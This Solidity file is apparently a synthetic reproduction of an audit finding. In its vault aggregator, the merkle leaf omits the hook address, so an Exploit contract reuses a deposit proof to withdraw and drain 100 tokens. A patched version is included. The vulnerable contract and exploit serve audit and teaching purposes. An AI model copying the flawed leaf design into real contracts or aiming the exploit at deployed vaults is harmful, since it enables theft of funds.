// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Superform SuperVaultAggregator — the merkle leaf omits the hook address
    (Spearbit, Superform v2 periphery, June 2025).
    SYNTHETIC, cheatcode-free, one block.
    A single-leaf tree authorizes hook arguments of 100 ASSET for the deposit
    hook. The leaf is keccak256(args) and does not include the hook, so the
    same proof is accepted for the withdraw hook and 100 ASSET moves.
    Control hashes the hook into the leaf. The withdraw proof then fails. */

contract Asset {
    string public constant name = "ASSET";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Aggregator {
    Asset public asset;
    bytes32 public root;
    uint256 public moved;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function setRoot(bytes32 root_) external {
        root = root_;
    }

    function leafFor(bytes memory args) public pure returns (bytes32) {
        // @> VULN: the leaf is the args only, so two hooks with the same args share a proof
        return keccak256(bytes.concat(keccak256(args)));
    }

    function execute(address hook, uint256 amount, bytes32[] calldata proof) external {
        bytes32 leaf = leafFor(abi.encode(amount));
        bytes32 computed = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 sibling = proof[i];
            computed = computed < sibling
                ? keccak256(abi.encodePacked(computed, sibling))
                : keccak256(abi.encodePacked(sibling, computed));
        }
        require(computed == root, "proof");
        hook;
        moved = amount;
        asset.transfer(msg.sender, amount);
    }
}

contract AggregatorFixed {
    Asset public asset;
    bytes32 public root;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function setRoot(bytes32 root_) external {
        root = root_;
    }

    function leafFor(address hook, bytes memory args) public pure returns (bytes32) {
        // FIX: bind the proof to the hook that was authorized
        return keccak256(bytes.concat(keccak256(abi.encode(hook, args))));
    }

    function execute(address hook, uint256 amount, bytes32[] calldata proof) external {
        bytes32 leaf = leafFor(hook, abi.encode(amount));
        bytes32 computed = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 sibling = proof[i];
            computed = computed < sibling
                ? keccak256(abi.encodePacked(computed, sibling))
                : keccak256(abi.encodePacked(sibling, computed));
        }
        require(computed == root, "proof");
        asset.transfer(msg.sender, amount);
    }
}

contract Exploit {
    address public constant HOOK_A = address(0xA11CE);
    address public constant HOOK_B = address(0xB0B);

    Asset public asset;
    Aggregator public agg;
    uint256 public taken;

    constructor() {
        asset = new Asset();
        agg = new Aggregator(asset);
    }

    function run() external {
        uint256 n = 100 ether;
        asset.mint(address(agg), n);
        bytes32 leaf = agg.leafFor(abi.encode(n));
        agg.setRoot(leaf);
        bytes32[] memory proof = new bytes32[](0);
        agg.execute(HOOK_B, n, proof);
        taken = asset.balanceOf(address(this));
        require(taken == n, "moved");
        require(agg.moved() == n, "recorded");
        require(asset.balanceOf(address(agg)) == 0, "drained");
    }
}
